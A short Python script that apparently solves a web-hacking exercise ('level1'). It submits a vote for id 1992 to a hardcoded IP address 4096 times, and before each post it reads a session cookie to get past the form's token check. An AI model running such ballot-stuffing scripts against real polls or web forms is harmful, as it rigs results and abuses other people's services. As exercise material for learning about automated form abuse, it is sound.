#!/usr/bin/python3
""" Write a script or a program that votes 4096 times for your id here: http://158.69.76.135/level1.php """
import requests

url = "http://158.69.76.135/level1.php"

with requests.session() as client:
	for cont in range(4096):
		key = client.get(url)
		# dict_key = key.cookies.get_dict()
		data = {"id": 1992, "holdthedoor": "submit", "key": key.cookies.get_dict()['HoldTheDoor']}
		client.post(url, data)
